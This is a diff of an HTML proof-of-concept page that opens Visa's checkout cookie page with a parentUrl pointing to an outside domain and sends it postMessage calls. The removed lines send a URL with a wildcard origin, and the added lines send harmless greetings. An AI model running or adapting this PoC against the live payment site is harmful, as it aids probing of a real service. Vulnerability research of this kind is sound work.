@@ -6,16 +6,16 @@
     <script>
         function pocLink() {
             let win = window.open('https://secure.checkout.visa.com/resources/html/cookie_health/cookie_ready.html?parentUrl=https://xsnapfish.com/visa.html');
-            let msg = "https://secure.checkout.visa.com";
+            let msg = "Hello from PoC link";
             
             setTimeout(function(){
-                win.postMessage(msg, '*');
+                window.parent.postMessage(msg, 'https://secure.checkout.visa.com');
             }, 5000);
         }
         function pocFrame(win) {           
-            let msg = "https://secure.checkout.visa.com";
+            let msg = "Hello from iframe";
             
-            win.postMessage(msg, '*');          
+            win.postMessage(msg, 'https://secure.checkout.visa.com');          
         }
     </script>
 </head>
